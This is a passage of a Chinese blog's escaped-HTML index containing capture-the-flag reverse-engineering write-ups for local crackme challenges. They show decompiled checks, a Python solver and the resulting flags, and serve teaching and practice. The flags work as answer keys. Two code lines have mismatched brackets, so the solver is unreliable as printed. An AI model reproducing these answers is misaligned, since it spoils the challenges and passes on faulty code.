&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;| |  | | | | \\\\ `--.  | |   \\\\ `--.  ___  ___ &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;| |/\\\\| | | | |`--. \\\\ | |    `--. \\\\/ _ \\\\/ __|&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\\\  /\\\\  / |_| /\\\\__/ / | |   /\\\\__/ /  __/ (__ &quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot; \\\\/  \\\\/ \\\\___/\\\\____/  \\\\_/   \\\\____/ \\\\___|\\\\___|&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Input the flag&quot;</span>);</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, v4);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)check((__int64)v4) == <span class=\"number\">1</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;0ops, your flag seems fake.&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;==============================&quot;</span>);</span><br><span class=\"line\">    rewind(_bss_start);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Your flag is correct, go and submit it!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看来核心函数是(unsigned int)check((__int64)v4)，并且是比较函数，跟踪一下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">check</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> iven_is_handsome((_BYTE *)a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>一路跟踪（顺便转换一下ASCII编码）：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_is_handsome</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">10</span>] == <span class=\"string\">&#x27;p&#x27;</span> </span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">13</span>] == <span class=\"string\">&#x27;@&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">3</span>] == <span class=\"string\">&#x27;f&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">26</span>] == <span class=\"string\">&#x27;r&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">20</span>] == <span class=\"string\">&#x27;e&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; iven_is_c0ol(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_is_c0ol</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">7</span>] == <span class=\"string\">&#x27;0&#x27;</span> </span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">16</span>] == <span class=\"string\">&#x27;_&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">11</span>] == <span class=\"string\">&#x27;p&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">23</span>] == <span class=\"string\">&#x27;e&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">30</span>] == <span class=\"string\">&#x27;u&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; iven_1s_educated(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_1s_educated</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> *a1 == <span class=\"string\">&#x27;w&#x27;</span> </span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">6</span>] == <span class=\"string\">&#x27;2&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">22</span>] == <span class=\"string\">&#x27;s&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">31</span>] == <span class=\"string\">&#x27;n&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">12</span>] == <span class=\"string\">&#x27;_&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)iven_1s_brave(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_1s_brave</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">15</span>] == <span class=\"string\">&#x27;d&#x27;</span> </span><br><span class=\"line\">  \t  &amp;&amp; a1[<span class=\"number\">8</span>] == <span class=\"string\">&#x27;&#123;&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">18</span>] == <span class=\"string\">&#x27;3&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">28</span>] == <span class=\"string\">&#x27;_&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; a1[<span class=\"number\">21</span>] == <span class=\"string\">&#x27;r&#x27;</span> </span><br><span class=\"line\">\t  &amp;&amp; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)iven_1s_great(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_1s_great</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">2</span>] == <span class=\"string\">&#x27;t&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">9</span>] == <span class=\"string\">&#x27;c&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">32</span>] == <span class=\"string\">&#x27;&#125;&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">19</span>] == <span class=\"string\">&#x27;v&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">5</span>] == <span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">14</span>] == <span class=\"string\">&#x27;n&#x27;</span></span><br><span class=\"line\">      &amp;&amp; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)iven_and_grace(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">iven_and_grace</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">4</span>] == <span class=\"string\">&#x27;2&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">17</span>] == <span class=\"string\">&#x27;r&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">29</span>] == <span class=\"string\">&#x27;f&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">17</span>] == <span class=\"string\">&#x27;r&#x27;</span></span><br><span class=\"line\">      &amp;&amp; a1[<span class=\"number\">24</span>] == <span class=\"string\">&#x27;_&#x27;</span></span><br><span class=\"line\">      &amp;&amp; (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)finally_fun(a1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">_BOOL8 __fastcall <span class=\"title\">finally_fun</span><span class=\"params\">(_BYTE *a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a1[<span class=\"number\">1</span>] == <span class=\"string\">&#x27;c&#x27;</span> </span><br><span class=\"line\">     &amp;&amp; a1[<span class=\"number\">25</span>] == <span class=\"string\">&#x27;@&#x27;</span> </span><br><span class=\"line\">\t &amp;&amp; a1[<span class=\"number\">27</span>] == <span class=\"string\">&#x27;e&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>手动统计一下就可以得到flag。<br>flag:<del>wctf2020{cpp_@nd_r3verse_@re_fun}</del></p>\n","categories":["Reserve"]},{"title":"MRCTF2020-Transform","url":"/2021/08/28/MRCTF2020-Transform/","content":"<p><a href=\"https://buuoj.cn/challenges#[MRCTF2020]Transform\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210828144512.png\"><br>IDA看一下主函数：<br><img src=\"/images/Writeup/20210828144537.png\"><br>F5逆向一下：<br><img src=\"/images/Writeup/20210828144600.png\"><br>核心函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">sub_40E640(<span class=\"string\">&quot;Give me your code:\\n&quot;</span>);  <span class=\"comment\">//打印欢迎信息</span></span><br><span class=\"line\">sub_40E5F0(<span class=\"string\">&quot;%s&quot;</span>, Str);  <span class=\"comment\">//读取用户输入</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ( <span class=\"built_in\">strlen</span>(Str) != <span class=\"number\">33</span> )  <span class=\"comment\">//判断用户输入的数据长度</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    sub_40E640(<span class=\"string\">&quot;Wrong!\\n&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//下面就是flag数据的所在</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">32</span>; ++i )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    byte_414040[i] = Str[dword_40F040[i);</span><br><span class=\"line\">    byte_414040[i] ^= LOBYTE(dword_40F040[i]);  <span class=\"comment\">//异或，加密</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt;= <span class=\"number\">32</span>; ++j )</span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( byte_40F0E0[j] != byte_414040[j] ) <span class=\"comment\">//判断flag数据与用户输入是否匹配</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    \tsub_40E640(<span class=\"string\">&quot;Wrong!\\n&quot;</span>);</span><br><span class=\"line\">    \tsystem(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">    \t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">sub_40E640(<span class=\"string\">&quot;Right!Good Job!\\n&quot;</span>);</span><br><span class=\"line\">sub_40E640(<span class=\"string\">&quot;Here is your flag: %s\\n&quot;</span>, Str);</span><br><span class=\"line\">system(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">```  </span><br><span class=\"line\">也就是先将输入的flag使用dword_40F040数组作为索引，打乱顺序，再将打乱后的flag数组，与dword_40F040数组异或，得到byte_40F0E0</span><br><span class=\"line\">![](/images/Writeup/<span class=\"number\">20210828145701.</span>png)</span><br><span class=\"line\">对应写一个脚本：</span><br><span class=\"line\">```python</span><br><span class=\"line\">model = [<span class=\"number\">0x9</span>, <span class=\"number\">0x0A</span>, <span class=\"number\">0x0F</span>, <span class=\"number\">0x17</span>, <span class=\"number\">0x7</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0x0C</span>, <span class=\"number\">0x6</span>, <span class=\"number\">0x1</span>, <span class=\"number\">0x10</span>, <span class=\"number\">0x3</span>, <span class=\"number\">0x11</span>, <span class=\"number\">0x20</span>, <span class=\"number\">0x1D</span>, <span class=\"number\">0x0B</span>, <span class=\"number\">0x1E</span>, <span class=\"number\">0x1B</span>, <span class=\"number\">0x16</span>, <span class=\"number\">0x4</span>, <span class=\"number\">0x0D</span>, <span class=\"number\">0x13</span>, <span class=\"number\">0x14</span>, <span class=\"number\">0x15</span>, <span class=\"number\">0x2</span>, <span class=\"number\">0x19</span>, <span class=\"number\">0x5</span>, <span class=\"number\">0x1F</span>, <span class=\"number\">0x8</span>, <span class=\"number\">0x12</span>, <span class=\"number\">0x1A</span>, <span class=\"number\">0x1C</span>, <span class=\"number\">0x0E</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">model1 = [<span class=\"number\">0x67</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x7B</span>, <span class=\"number\">0x7F</span>, <span class=\"number\">0x75</span>, <span class=\"number\">0x2B</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x52</span>, <span class=\"number\">0x53</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x5E</span>, <span class=\"number\">0x5D</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x7B</span>, <span class=\"number\">0x2D</span>, <span class=\"number\">0x2A</span>, <span class=\"number\">0x66</span>, <span class=\"number\">0x42</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x4C</span>, <span class=\"number\">0x57</span>, <span class=\"number\">0x79</span>, <span class=\"number\">0x41</span>, <span class=\"number\">0x6B</span>, <span class=\"number\">0x7E</span>, <span class=\"number\">0x65</span>, <span class=\"number\">0x3C</span>, <span class=\"number\">0x5C</span>, <span class=\"number\">0x45</span>, <span class=\"number\">0x6F</span>, <span class=\"number\">0x62</span>, <span class=\"number\">0x4D</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">flag = [<span class=\"number\">0</span>]*<span class=\"number\">33</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i in range(len(model)):</span><br><span class=\"line\">    model1[i] ^= model[i]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i in range(len(model)):</span><br><span class=\"line\">    flag[model[i) = model1[i]</span><br><span class=\"line\">print (<span class=\"string\">&#x27;&#x27;.join([chr(x) for x in flag]))</span></span><br></pre></td></tr></table></figure>\n<p>flag:<del>MRCTF{Tr4nsp0sltiON_Clph3r_1s_3z}</del><br><em>记得改提交格式</em></p>\n","categories":["Reserve"]},{"title":"Mysterious","url":"/2021/09/22/Mysterious/","content":"<p><a href=\"https://buuoj.cn/challenges#Mysterious\">题目链接</a></p>\n<h1 id=\"01-分析程序信息\"><a href=\"#01-分析程序信息\" class=\"headerlink\" title=\"01 分析程序信息\"></a>01 分析程序信息</h1><p>附件下载下来，估摸着应该是一道简单逆向，看一下信息：</p>\n<p><img src=\"/images/Writeup/image-20210922220606822.png\" alt=\"image-20210922220606822\"></p>\n<p>IDA看一下程序结构：</p>\n<p><img src=\"/images/Writeup/image-20210922231918417.png\" alt=\"image-20210922231918417\"></p>\n<h1 id=\"02-分析核心函数，并且查看伪代码\"><a href=\"#02-分析核心函数，并且查看伪代码\" class=\"headerlink\" title=\"02 分析核心函数，并且查看伪代码\"></a>02 分析核心函数，并且查看伪代码</h1><p>看一下函数列表，找到关键函数<code>sub_401090</code>：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __stdcall <span class=\"title\">sub_401090</span><span class=\"params\">(HWND hWnd, <span class=\"keyword\">int</span> a2, <span class=\"keyword\">int</span> a3, <span class=\"keyword\">int</span> a4)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> v4;           <span class=\"comment\">// eax</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> Source[<span class=\"number\">260</span>]; <span class=\"comment\">// [esp+50h] [ebp-310h] BYREF</span></span><br><span class=\"line\">    CHAR Text[<span class=\"number\">5</span>];     <span class=\"comment\">// [esp+154h] [ebp-20Ch] BYREF</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> v8[<span class=\"number\">252</span>];     <span class=\"comment\">// [esp+159h] [ebp-207h] BYREF</span></span><br><span class=\"line\">    __int16 v9;       <span class=\"comment\">// [esp+255h] [ebp-10Bh]</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> v10;         <span class=\"comment\">// [esp+257h] [ebp-109h]</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> Value;        <span class=\"comment\">// [esp+258h] [ebp-108h]</span></span><br><span class=\"line\">    CHAR String[<span class=\"number\">260</span>]; <span class=\"comment\">// [esp+25Ch] [ebp-104h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(String, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(String));</span><br><span class=\"line\">    Value = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a2 == <span class=\"number\">16</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        DestroyWindow(hWnd);</span><br><span class=\"line\">        PostQuitMessage(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (a2 == <span class=\"number\">273</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a3 == <span class=\"number\">1000</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            GetDlgItemTextA(hWnd, <span class=\"number\">1002</span>, String, <span class=\"number\">260</span>);</span><br><span class=\"line\">            <span class=\"built_in\">strlen</span>(String);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(String) &gt; <span class=\"number\">6</span>)</span><br><span class=\"line\">                ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">            v4 = atoi(String);</span><br><span class=\"line\">            Value = v4 + <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (v4 == <span class=\"number\">122</span> &amp;&amp; String[<span class=\"number\">3</span>] == <span class=\"number\">120</span> &amp;&amp; String[<span class=\"number\">5</span>] == <span class=\"number\">122</span> &amp;&amp; String[<span class=\"number\">4</span>] == <span class=\"number\">121</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"built_in\">strcpy</span>(Text, <span class=\"string\">&quot;flag&quot;</span>);</span><br><span class=\"line\">                <span class=\"built_in\">memset</span>(v8, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(v8));</span><br><span class=\"line\">                v9 = <span class=\"number\">0</span>;</span><br><span class=\"line\">                v10 = <span class=\"number\">0</span>;</span><br><span class=\"line\">                _itoa(Value, Source, <span class=\"number\">10</span>);</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(Text, <span class=\"string\">&quot;&#123;&quot;</span>);</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(Text, Source);</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(Text, <span class=\"string\">&quot;_&quot;</span>);</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(Text, <span class=\"string\">&quot;Buff3r_0v3rf|0w&quot;</span>);</span><br><span class=\"line\">                <span class=\"built_in\">strcat</span>(Text, <span class=\"string\">&quot;&#125;&quot;</span>);</span><br><span class=\"line\">                MessageBoxA(<span class=\"number\">0</span>, Text, <span class=\"string\">&quot;well done&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            SetTimer(hWnd, <span class=\"number\">1u</span>, <span class=\"number\">0x3E8</span>u, TimerFunc);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a3 == <span class=\"number\">1001</span>)</span><br><span class=\"line\">            KillTimer(hWnd, <span class=\"number\">1u</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>很简单就可以看到flag的主要形态：flag{ {source} _Buff3r_0v3rf|0w}，那么现在的问题就在于分析source的数据，再定位一下相关函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __stdcall <span class=\"title\">sub_401090</span><span class=\"params\">(HWND hWnd, <span class=\"keyword\">int</span> a2, <span class=\"keyword\">int</span> a3, <span class=\"keyword\">int</span> a4)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    GetDlgItemTextA(hWnd, <span class=\"number\">1002</span>, String, <span class=\"number\">260</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strlen</span>(String);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(String) &gt; <span class=\"number\">6</span>)</span><br><span class=\"line\">        ExitProcess(<span class=\"number\">0</span>);</span><br><span class=\"line\">    v4 = atoi(String);</span><br><span class=\"line\">    Value = v4 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    _itoa(Value, Source, <span class=\"number\">10</span>);</span><br><span class=\"line\">    <span class=\"built_in\">strcat</span>(Text, Source);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"03-追踪加密函数\"><a href=\"#03-追踪加密函数\" class=\"headerlink\" title=\"03 追踪加密函数\"></a>03 追踪加密函数</h1><p>说明用户在文本框输入的数据被储存在<code>String</code>里面，然后如果<code>String</code>的长度大于6则退出程序。接着用<code>atoi</code>函数处理<code>String</code>，并且把结果储存在<code>v4</code>里面。后<code>v4+1</code>赋值<code>Value</code>，再用<code>_itoa</code>处理<code>Value</code>的值，后把结果储存在<code>Source</code>,并作为flag的一部分。那么关键就在于<code>atoi</code>和<code>_itoa</code>两个函数的逻辑。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">atoi</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *String)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> atol(String);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">atol</span><span class=\"params\">(<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *String)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> result;          <span class=\"comment\">// eax</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> v4;              <span class=\"comment\">// [esp+8h] [ebp-Ch]</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> v5;              <span class=\"comment\">// [esp+Ch] [ebp-8h]</span></span><br><span class=\"line\">    <span class=\"keyword\">int</span> C;               <span class=\"comment\">// [esp+10h] [ebp-4h]</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *Stringa; <span class=\"comment\">// [esp+1Ch] [ebp+8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">while</span> (cbMultiByte &lt;= <span class=\"number\">1</span> ? *((_WORD *)off_424A60 + *(<span class=\"keyword\">unsigned</span> __int8 *)String) &amp; <span class=\"number\">8</span> : _isctype(*(<span class=\"keyword\">unsigned</span> __int8 *)String, <span class=\"number\">8</span>))</span><br><span class=\"line\">        ++String;</span><br><span class=\"line\">    C = *(<span class=\"keyword\">unsigned</span> __int8 *)String;</span><br><span class=\"line\">    Stringa = String + <span class=\"number\">1</span>;</span><br><span class=\"line\">    v4 = C;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (C == <span class=\"number\">45</span> || C == <span class=\"number\">43</span>)</span><br><span class=\"line\">        C = *(<span class=\"keyword\">unsigned</span> __int8 *)Stringa++;</span><br><span class=\"line\">    v5 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (cbMultiByte &lt;= <span class=\"number\">1</span> ? *((_WORD *)off_424A60 + C) &amp; <span class=\"number\">4</span> : _isctype(C, <span class=\"number\">4</span>))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v5 = <span class=\"number\">10</span> * v5 + C - <span class=\"number\">48</span>;</span><br><span class=\"line\">        C = *(<span class=\"keyword\">unsigned</span> __int8 *)Stringa++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v4 == <span class=\"number\">45</span>)</span><br><span class=\"line\">        result = -v5;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        result = v5;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">char</span> *__cdecl _itoa(<span class=\"keyword\">int</span> Value, <span class=\"keyword\">char</span> *Buffer, <span class=\"keyword\">int</span> Radix)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( Radix == <span class=\"number\">10</span> &amp;&amp; Value &lt; <span class=\"number\">0</span> )</span><br><span class=\"line\">    xtoa(Value, Buffer, <span class=\"number\">10</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">    xtoa(Value, Buffer, Radix, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> Buffer;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">char</span> *__cdecl <span class=\"title\">xtoa</span><span class=\"params\">(<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> a1, <span class=\"keyword\">char</span> *a2, <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> a3, <span class=\"keyword\">int</span> a4)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> *result;    <span class=\"comment\">// eax</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> v5;         <span class=\"comment\">// [esp+0h] [ebp-10h]</span></span><br><span class=\"line\">    <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v6; <span class=\"comment\">// [esp+4h] [ebp-Ch]</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *v7;        <span class=\"comment\">// [esp+8h] [ebp-8h]</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *v8;        <span class=\"comment\">// [esp+Ch] [ebp-4h]</span></span><br><span class=\"line\">    <span class=\"keyword\">char</span> *v9;        <span class=\"comment\">// [esp+Ch] [ebp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">    v8 = a2;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (a4)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        *a2 = <span class=\"number\">45</span>;</span><br><span class=\"line\">        v8 = a2 + <span class=\"number\">1</span>;</span><br><span class=\"line\">        a1 = -a1;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    v7 = v8;</span><br><span class=\"line\">    <span class=\"keyword\">do</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        v6 = a1 % a3;</span><br><span class=\"line\">        a1 /= a3;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (v6 &lt;= <span class=\"number\">9</span>)</span><br><span class=\"line\">            *v8 = v6 + <span class=\"number\">48</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            *v8 = v6 + <span 